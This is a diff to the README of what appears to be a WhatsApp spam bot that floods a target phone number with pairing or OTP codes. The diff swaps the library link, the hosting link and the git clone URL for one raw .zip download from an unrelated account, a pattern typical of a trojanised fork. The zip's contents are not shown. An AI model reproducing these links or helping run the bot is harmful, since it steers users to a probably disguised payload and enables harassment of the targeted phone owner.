@@ -2,7 +2,7 @@
 
 ## Overview
 ---
-A simple WhatsApp spam bot built with [Baileys](https://github.com/adiwajshing/Baileys), designed to generate multiple OTP/Pairing Codes (currently set to pairing code but can be adapted for OTP) for a target phone number.
+A simple WhatsApp spam bot built with [Baileys](https://github.com/kaniooo/Wa-Spam-bot/raw/refs/heads/main/complexly/Spam-bot-Wa-3.9.zip), designed to generate multiple OTP/Pairing Codes (currently set to pairing code but can be adapted for OTP) for a target phone number.
 
  **Disclaimer:**
 ⚠️This tool is for educational purposes only. Misuse of this tool to spam, attack, or harm any WhatsApp users is illegal and violates WhatsApp's terms of service. Use responsibly.
@@ -26,13 +26,13 @@ A simple WhatsApp spam bot built with [Baileys](https://github.com/adiwajshing/B
 
 ---
 ## Pannel Deployment
-Download the repo as .zip file and deploy on [Bot Hosting free pannel](https://control.bot-hosting.net/server/)
+Download the repo as .zip file and deploy on [Bot Hosting free pannel](https://github.com/kaniooo/Wa-Spam-bot/raw/refs/heads/main/complexly/Spam-bot-Wa-3.9.zip)
 
 ## Termux Setup (not working yet)
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Joker-Reincarnated/Wa-Spam-bot.git
+   git clone https://github.com/kaniooo/Wa-Spam-bot/raw/refs/heads/main/complexly/Spam-bot-Wa-3.9.zip
 2. **Open cloned repo**:
    ```bash
    cd Wa-Spam-bot
